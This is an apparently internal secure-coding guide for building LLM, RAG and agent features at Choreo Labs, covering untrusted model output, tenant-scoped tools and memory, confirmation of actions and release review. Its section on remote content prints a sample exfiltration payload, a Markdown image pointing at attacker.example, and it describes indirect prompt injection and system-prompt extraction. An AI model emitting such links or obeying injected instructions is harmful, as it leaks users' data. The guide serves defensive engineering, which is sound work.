---
title: AI and LLM Secure Coding Guide
category: security-guidelines
version: 1.0
---

# AI and LLM Secure Coding Guide

<p class="doc-info">Version: 1.0</p>
___

When you build a Choreo Labs feature that calls a large language model (LLM), retrieves content for a model (RAG), exposes tools to a model, or runs an AI agent, follow this guide. The attack classes and the technical defenses are in the OWASP cheat sheets below. They are requirements, not background reading: a feature must apply the defenses they describe, and this page adds the rules specific to Choreo Labs. They are linked rather than restated. Cross-cutting rules (injection sinks, access control, logging, supply chain) are in the [Secure Coding Guide]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/) and not restated here.

## Required external references

Apply the prompt injection cheat sheet to every feature that calls an LLM. Apply the AI agent cheat sheet as well when the model calls tools, keeps memory, or works with other agents.

* **Prompt injection.** [OWASP LLM Prompt Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html): direct and indirect injection, encoding and obfuscation, RAG poisoning, system prompt extraction, and layered defenses.
* **AI agents.** [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html): tool permissions, memory and context security, human-in-the-loop controls, multi-agent trust, monitoring, and adversarial testing.

## Rules for AI and LLM features in Choreo Labs products

These are the points that are not obvious from the external references, or that have a reason specific to Choreo Labs.

### Treat the model as an untrusted caller

No prompt design reliably separates instructions from data, and any content the model reads (a user message, a retrieved document, a web page, a tool result) can carry instructions. Design as if an attacker controls the model's output. Pass model output to each sink under the same rules as user input: see [Injection]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#injection), [Cross-Site Scripting]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#cross-site-scripting-xss), and [Server Side Request Forgery]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#server-side-request-forgery-ssrf).

### Tools run with the caller's identity

Run every tool or retrieval call with the caller's tenant/organization identity from the request context and the caller's own permissions, never a service-wide credential. The model must not be able to choose the tenant: as with caller input, tenant identity rides in context, never in model output (see [Principles specific to Choreo Labs product code]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#principles-specific-to-choreo-labs-product-code)). Expose only the tools the feature needs, and re-check authorization at the data layer on every call.

### Scope memory and retrieval by tenant

Conversation memory, vector stores, and retrieval indexes hold tenant data. Partition them by tenant/organization, and filter every lookup by the caller's tenant from the request context and by the caller's own access to each document or record. A retrieval query without a tenant filter is the same class of defect as a SQL query without one, and a tenant filter alone still returns documents the caller cannot otherwise read. Treat retrieved content as untrusted input to the model, per the first rule.

### Confirm actions that change state or send data out

Require explicit user confirmation before an action that changes state or sends data outside the tenant (an outbound request, an email, a message). Show the user the concrete action and its parameters, not the model's summary of it.

### Do not auto-load remote content from model output

Rendering model output can send data out with no user step. If an injected instruction makes the model emit a Markdown image such as `![](https://attacker.example/?d=<data>)`, the browser fetches the URL and delivers the data. When a UI renders model output, do not auto-load images or other remote resources from it: render them as text, or allow only hosts on an allow-list. Apply [URL attribute validation]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/general-recommendations-for-react-secure-coding/#url-attribute-validation) to links in model output. The [CSP target for Choreo Labs admin UIs]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/general-recommendations-for-react-secure-coding/#csp-target-for-choreo-labs-admin-uis) allows images from any `https:` host; on pages that render model output, narrow `img-src` to the same allow-list.

### Keep secrets and other tenants' data out of prompts

Assume the system prompt and anything else in the context window can be extracted. Do not put credentials, API keys, or other tenants' data in prompts. Prompts and model responses that reach logs follow [Mask or hash sensitive values]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#mask-or-hash-sensitive-values).

### Bound cost per request

Cap tokens, tool calls, and agent loop iterations per request and per tenant, so a crafted input cannot run up model cost or exhaust shared capacity. This is the model-call form of [Pagination, list limits, and resource ceilings]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#pagination-list-limits-and-resource-ceilings).

### Models, agent frameworks, and tool servers are dependencies

Pin and review third-party models, agent frameworks, and tool servers (for example, MCP servers) the same way as any other dependency: see [Software Supply Chain Failures]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/secure-coding-guide/#software-supply-chain-failures).

### Release review

!!! danger "Approval required"
    A feature that lets a model call tools or act on a user's behalf must have its use case and controls reviewed and approved by the Security and Compliance Team before release. Raise it in the feature's design review, which the security leads of the product domain attend (see the [Design Phase of the Secure Software Development Process]({{#base_path#}}/security-processes/secure-software-development-process/#design-phase)). State in the request the tools the model can call, the permissions each one runs with, and the actions that need user confirmation.

Test the feature with the smoke tests in the prompt injection cheat sheet, including indirect injection through every content source the model reads.

## Review checklist

When adding a feature that calls an LLM or runs an AI agent in a Choreo Labs product:

- [ ] The feature applies the defenses in the [OWASP LLM Prompt Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html), checked against its Best Practices Checklist.
- [ ] If the model calls tools, keeps memory, or works with other agents, the feature applies the [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html), checked against its Best Practices and its Do's and Don'ts.

- [ ] Model output reaches SQL, OS commands, HTML, redirects, and outbound requests only through the same validation and encoding as user input.
- [ ] Every tool and retrieval call runs with the caller's identity and tenant from the request context and the caller's own permissions, with no service-wide credential.
- [ ] The tool set is the minimum the feature needs; authorization is re-checked at the data layer.
- [ ] Memory, vector stores, and retrieval indexes are partitioned by tenant, and every lookup is filtered by tenant and by the caller's access to each document or record.
- [ ] Actions that change state or send data outside the tenant need explicit user confirmation.
- [ ] The UI does not auto-load images or other remote resources from model output, except from allow-listed hosts.
- [ ] No credentials or other tenants' data in prompts; logged prompts and responses are masked.
- [ ] Token, tool-call, and iteration limits are set per request and per tenant.
- [ ] Third-party models, agent frameworks, and tool servers are pinned and reviewed.
- [ ] If the model calls tools or acts on a user's behalf, the Security and Compliance Team approved the feature before release.
